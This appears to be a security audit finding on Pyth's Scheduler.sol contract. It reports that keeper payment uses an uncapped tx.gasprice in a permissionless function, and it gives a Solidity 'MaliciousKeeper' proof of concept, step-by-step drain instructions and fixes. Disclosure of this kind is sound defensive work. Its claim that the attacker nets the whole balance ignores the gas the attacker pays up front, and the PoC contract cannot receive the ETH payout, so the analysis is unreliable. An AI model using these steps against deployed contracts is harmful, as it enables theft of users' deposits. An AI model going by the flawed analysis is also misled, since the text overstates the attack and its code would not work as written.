### Title
Malicious Keeper Can Drain Subscription Balance via Inflated `tx.gasprice` in `updatePriceFeeds` - (File: `target_chains/ethereum/contracts/contracts/pulse/Scheduler.sol`)

---

### Summary

The `Scheduler` contract's `_processFeesAndPayKeeper` function reimburses the calling keeper using `tx.gasprice` as a direct multiplier with no upper bound. Because `updatePriceFeeds` is fully permissionless, any attacker can call it with a valid price update while setting an arbitrarily high gas price, causing the contract to transfer the subscription's entire balance to the attacker in a single transaction.

---

### Finding Description

`updatePriceFeeds` in `Scheduler.sol` is an open, permissionless function — no access control restricts who may act as a keeper:

```solidity
function updatePriceFeeds(
    uint256 subscriptionId,
    bytes[] calldata updateData
) external override {
    uint256 startGas = gasleft();
    ...
    _processFeesAndPayKeeper(status, startGas, params.priceIds.length);
``` [1](#0-0) 

Inside `_processFeesAndPayKeeper`, the keeper payment is computed as:

```solidity
uint256 gasCost = (startGas - gasleft() + GAS_OVERHEAD) * tx.gasprice;
uint256 keeperSpecificFee = uint256(_state.singleUpdateKeeperFeeInWei) * numPriceIds;
uint256 totalKeeperFee = gasCost + keeperSpecificFee;
``` [2](#0-1) 

The only guard before paying out is:

```solidity
if (status.balanceInWei < totalKeeperFee) {
    revert SchedulerErrors.InsufficientBalance();
}
``` [3](#0-2) 

`tx.gasprice` is entirely attacker-controlled. There is no cap, no comparison against a reference gas price, and no maximum keeper fee limit. An attacker who submits a valid update (satisfying heartbeat or deviation criteria) with a crafted `tx.gasprice` can make `totalKeeperFee` equal to `status.balanceInWei`, causing the full subscription balance to be sent to `msg.sender`:

```solidity
(bool sent, ) = msg.sender.call{value: totalKeeperFee}("");
``` [4](#0-3) 

The `GAS_OVERHEAD` constant is only 30,000 gas units: [5](#0-4) 

For a subscription with balance `B` and approximate gas usage `G` (e.g., ~150,000 gas for a typical update), the attacker sets:

```
tx.gasprice = B / (G + 30000)
```

This makes `totalKeeperFee ≤ B`, bypassing the only guard, and the full balance is extracted.

---

### Impact Explanation

Any subscription's entire deposited balance can be stolen in a single transaction. Permanent subscriptions can hold up to `MAX_DEPOSIT_LIMIT = 100 ether`: [6](#0-5) 

Non-permanent subscriptions have no explicit deposit cap. All subscription managers who have funded their subscriptions are at risk of total loss of funds. The attack requires no special privileges — only the ability to submit a valid price update when trigger conditions are met, which is the normal permissionless keeper role described in the README: [7](#0-6) 

---

### Likelihood Explanation

The keeper network is explicitly permissionless by design. Any EOA or contract can call `updatePriceFeeds`. Trigger conditions (heartbeat or price deviation) are met regularly in normal operation. An attacker only needs to monitor active subscriptions via `getActiveSubscriptions`, wait for a trigger condition to be satisfied, and front-run or simply be the first to submit the update with an inflated `tx.gasprice`. This is straightforward to execute with no special knowledge or infrastructure beyond a standard Ethereum node.

---

### Recommendation

1. **Cap `tx.gasprice` against a reference**: Compare `tx.gasprice` against a stored or oracle-derived maximum gas price (e.g., `block.basefee * multiplier`) and use `min(tx.gasprice, maxAllowedGasPrice)` in the fee calculation.

2. **Introduce a maximum keeper fee per update**: Add a configurable `maxKeeperFeePerUpdateInWei` parameter and cap `totalKeeperFee` at that value.

3. **Use a permissioned keeper whitelist**: Restrict `updatePriceFeeds` to a set of trusted keeper addresses controlled by the admin. This eliminates the open-access attack surface entirely, at the cost of decentralization.

### Proof of Concept

```solidity
// Attacker contract
contract MaliciousKeeper {
    IScheduler scheduler;
    constructor(address _scheduler) { scheduler = IScheduler(_scheduler); }

    function drain(
        uint256 subscriptionId,
        bytes[] calldata updateData,
        uint256 subscriptionBalance
    ) external {
        // Attacker calls updatePriceFeeds with a valid update.
        // tx.gasprice is set by the attacker when submitting this tx.
        // e.g., via: cast send --gas-price <crafted_value> ...
        // The contract computes:
        //   gasCost = (gasUsed + 30000) * tx.gasprice
        // With gasUsed ≈ 150000 and tx.gasprice = subscriptionBalance / 180000,
        // totalKeeperFee ≈ subscriptionBalance → full balance sent to msg.sender.
        scheduler.updatePriceFeeds(subscriptionId, updateData);
        // Attacker's address now holds the subscription's entire balance.
    }
}
```

**Steps**:
1. Deploy `MaliciousKeeper`.
2. Identify a subscription with a large `balanceInWei` (readable via `getActiveSubscriptions`).
3. Wait for the subscription's heartbeat or deviation trigger to be satisfiable.
4. Fetch valid Pyth `updateData` from Hermes for the subscription's price IDs.
5. Call `drain` with `tx.gasprice` set to `subscriptionBalance / (estimatedGasUsed + 30000)`.
6. The contract pays `totalKeeperFee ≈ subscriptionBalance` to the attacker.

- Anyone can run a Keeper node; no registration is required to call `updatePriceFeeds`. The main goal of making this component a permissionless network rather a set of permissioned nodes is to enhance reliability for the feeds -- if one provider fails, others should be available to service the subscriptions. The payment covers gas costs plus a premium, and payment is sent directly to `msg.sender` (the keeper) at the end of `updatePriceFeeds`. The first transaction included in a block that passes checks will succeed and receive the payment. Subsequent attempts for the same update interval will revert since we verify the update criteria on-chain. By only allowing updates when they are needed, we keep costs predictable for the users.
